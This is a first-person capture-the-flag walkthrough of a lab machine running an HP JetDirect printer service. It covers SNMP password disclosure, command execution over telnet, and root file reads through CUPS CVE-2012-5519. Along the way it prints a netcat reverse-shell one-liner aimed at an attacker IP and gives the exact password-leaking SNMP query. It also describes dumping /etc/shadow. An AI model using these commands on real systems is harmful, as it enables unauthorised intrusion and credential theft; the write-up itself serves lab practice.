Target IP: 10.129.207.94

Reconnaissance


I performed a port scan against the TCP ports using the command sudo nmap -sS 10.129.207.94 -p- and obtained the result shown above. I noticed telnet on port 23 is open on the target machine. I ran an aggresive port scan against this port.

I ran an aggressive port scan against the port 23 and obtained the result shown above. From the output above, I notice the application on port 23 seems to be asking for password.


I also performed a UDP port scan using the command sudo nmap -sU -sV -sC 10.129.207.94 --top-ports=10 -T4 and obtained the result shown above. I had to speed up the scan using the flags --top-ports and -T4, as it was taking forever. I notice the UDP port 161 is open. The application SNMP is being served on this port by the looks of it. Maybe I can enumerate this port to obtain more information about the network using tools such as snmpwalk and snmpcheck?

Enumeration

Port 23: Telnet

Using the command nc 10.129.207.94 23, I connected to the application on port 23 as shown above. Right away, I notice the application name is HP JetDirect and it informs me to input password. This application seems to be for a printer. I tried default credentials such as admin and root, but I had no luck.

Exploitation


I searched for HP JetDirect exploits online and obtained the website shown above. Apparently this application has password disclosure vulnerabililty. The PoC is simple too, I will need to query the string .1.3.6.1.4.1.11.2.3.9.1.1.13.0 to obtain the encoded password. Time to put it to test.


I ran the command snmpwalk -v 1 10.129.207.94 -c public and obtained the result shown above. This tool successfully detected the printer on the network. Now I need to query the specific string to obtain the password.


And bingo! Using the command snmpwalk -c public -v2c 10.129.207.94 .1.3.6.1.4.1.11.2.3.9.1.1.13.0, I managed to obtain the password of the device. The encoded password is the following: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135. Time to decode this.


To decode the encoded password, I used an online hex to ASCII converter tool as shown above. Then I obtained the password P@ssw0rd@123!!123.


I reconnected to the telnet application on port 23 using nc 10.129.207.94 23 and the password P@ssw0rd@123!!123, and got a hit as shown above. Um... This is insanity. The telnet application has a command called exec that can be used to perform command execution. If this is the case, I can perform RCE with this. I can also obtain a reverse shell connection using this application.


I executed a few commands such as exec id, exec whoami, and exec ls -la and obtained the results shown above. Time to obtain a reverse shell connection now.


And bingo! I started a listener on my machine at port 8443. Then using the telnet application on port 23, I deployed the command exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.139 8443 >/tmp/f and obtained a reverse shell connection with the session as lp. Now I have a foothold on the target machine with the session as lp.

Privilege Escalation


Running the command netstat -antop returns the result shown above. There is an application running on port 631 on the 127.0.0.1 interface. From previous knowledge, I know CUPS run on this port. But what version is it?


To identify the application version, I used the command curl 127.0.0.1:631, I notice the target machine is running CUPS 1.6.1 as shown above. And this application version is vulnerable to Root File Read. This vulnerability has the CVE identifier of CVE-2012-5519.


I found the Github repository shown above at https://github.com/p1ckzi/CVE-2012-5519. Then I made a copy of the script on my machine and transferred it to the target machine via Python HTTP server.


I changed the permission of the script to be executable. Then I executed it. With this exploit, I can now read files as the root user. Meaning I could grab the /etc/shadow or even the SSH key of user root.


However, I had no luck trying to obtain the SSH key of the user root. I successfully grabbed the /etc/shadow file. I unshadowed it with /etc/passwd file, but cracking the password hash of user root seems unlikely. However, I did manage to read the flag located at /root directory using this exploit. GG.
